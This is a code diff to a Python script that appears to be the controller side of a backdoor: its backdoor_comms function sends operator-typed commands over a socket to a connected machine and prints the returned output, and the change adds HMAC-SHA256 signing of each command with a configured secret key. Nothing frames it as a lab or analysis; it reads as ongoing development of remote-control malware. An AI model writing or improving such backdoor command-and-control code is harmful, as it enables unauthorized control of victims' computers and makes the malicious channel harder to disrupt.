@@ -11,8 +11,16 @@ config.read(config_path)
 
 HOST = config['Server']['address']
 PORT = int(config['Server']['port'])
-BUFFER = 4096
+BUFFER = int(config['Format']['buffer'])
 SEP = "<sep>"
+SECRET_KEY = config['Authentication']['key']
+
+def generate_hmac(command):
+    return hmac.new(
+        SECRET_KEY.encode(),
+        command.encode(),
+        hashlib.sha256
+    ).hexdigest()
 
 def backdoor_comms(conn):
     try:
@@ -26,8 +34,14 @@ def backdoor_comms(conn):
             if command.lower() == 'exit':
                 print("[*] Closing connection...")
                 break
-                
-            conn.send(command.encode())
+            
+            # Generate HMAC for the command
+            command_hmac = generate_hmac(command)
+            
+            # Send command and HMAC together
+            message = command + SEP + command_hmac
+            conn.send(message.encode())
+            
             output = conn.recv(BUFFER).decode()
             
             try:
@@ -35,6 +49,7 @@ def backdoor_comms(conn):
                 print(results)
             except ValueError:
                 print(output)
+                
     except ConnectionResetError:
         print("[-] Connection was reset by the client")
     except Exception as exception:
